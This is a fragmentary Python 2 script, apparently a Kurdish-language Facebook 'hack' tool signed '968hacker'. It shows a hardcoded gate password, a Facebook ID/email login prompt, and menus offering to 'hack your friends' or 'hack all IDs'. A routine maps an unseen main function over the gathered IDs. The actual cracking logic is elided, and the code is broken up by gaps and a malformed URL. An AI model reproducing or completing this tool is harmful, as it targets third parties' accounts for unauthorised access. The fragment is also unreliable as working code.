...
os.system("clear")
print("😁👍")
CorrectUsername = "968hacker"
CorrectPassword = "968hacker"
os.system('xdg-open https://www.youtube.com/channel/UC9nMDEX7XKkFWp3y82EEHYw')
loop = 'true'
while (loop == 'true'):
    username = raw_input("\x1b[34;1m👨 user \x1b[1;95m \x1b[31;1m>>\x1b[1;91m")
    if (username == CorrectUsername):
    	password = raw_input("\x1b[34;1m🤖\x1b[1;95mPaswword \x1b[37;1m>>>\x1b[1;91m")
        if (password == CorrectPassword):
            print "daxl bwet ba ID " + username #hhhh
	    time.sleep(2)
            loop = 'false'
        else:
...
def login():
	...
	try:
		...
		print logo
		print 42*"\033[1;96m="
		print('Ba Facebook Nwe Hack Bkan😁')
		print('||||||||||||||||||||||||||||||||||||||||||||||')
		id = raw_input('\x1b[35;1m😤ID&&EMAIL&&+0> \x1b[37;1m')
...
def menu():
	...
	print ""
	print "===================="
	print "\x1b[37;1m[1]>  hack krdn"
	print "\x1b[37;1m[2]> nwe krdnawa"
...
def graber():
	...
	os.system('clear')
	print logo
	print "\x1b[31;1m{1}~~Hack y hawre kant "
	print "\x1b[31;1m{2}~~Hack y hamu Id ak "
	print "\x1b[31;1m{0}~~chwna darawa"
	startgrab()

def startgrab():
	peak = raw_input("\x1b[37;1m@\x1b[31;1m>> ")
	if peak=="":
	...
	anime('          \x1b[34;1m  dastpe krdn  tkaya bosta..bo...5....10...daqa... ')
	print  " ########################"
	...
	p.map(main, id)
        anime("")
	anime("\x1b[37;1mRecode by 968" )#968hacker
	...
	print ""
	print(logo)
	os.system('xdg-open hthttps://www.youtube.com/channel/UC9nMDEX7XKkFWp3y82EEHYw')
	anime(">>>>>>>>>>>>>>><<<<<<<<<<<<<<<")
	anime(">>968hacker")
	anime(">>>>>>>>>>>>>>><<<<<<<<<<<<<<<")
	print ""
